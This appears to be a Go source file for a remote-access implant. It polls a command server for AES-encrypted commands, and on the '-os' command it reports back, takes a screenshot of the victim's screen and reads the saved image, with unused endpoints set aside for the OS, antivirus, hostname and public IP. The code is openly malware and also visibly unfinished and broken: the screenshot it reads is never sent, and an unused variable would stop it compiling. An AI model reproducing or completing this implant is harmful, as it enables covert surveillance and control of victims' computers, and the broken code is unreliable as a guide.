package main

import (
	"carga/helpers"
	"carga/methods"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

var (
	Url       = "http://localhost:9090/main"
	os        = "http://localhost:9090/os"
	antivirus = "http://localhost:9090/os"
	hostname  = "http://localhost:9090/os"
	ippublic  = "http://localhost:9090/os"
	Client    = http.Client{}
)

const key = "5345435454535"

func Getcomandos() {

	req, err := http.NewRequest("GET", Url, nil)
	if err != nil {
		log.Fatal(err)
	}
	res, err := Client.Do(req)
	//methods.Sendpost(Url2, Recolect.GetOS())

	if err != nil {
		log.Fatal(res)
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	var dec = aesgo.DecryptAes(string(body), key)
	if strings.Contains(dec, "-os") {
		var aa = "tomando captura"
		enc2 := aesgo.EncryptAes(string(aa), key)
		err := methods.Sendpost(Url, enc2)
		if err != nil {
			return
		}
		helpers.GetScreenshot()

		leer, err := ioutil.ReadFile("c:\\users\\public\\fotos.png")
		if err != nil {
			fmt.Println(err)
		}

	}
}

func main() {
	const espera time.Duration = 3
	Getcomandos()
	time.Sleep(espera * time.Second)
}
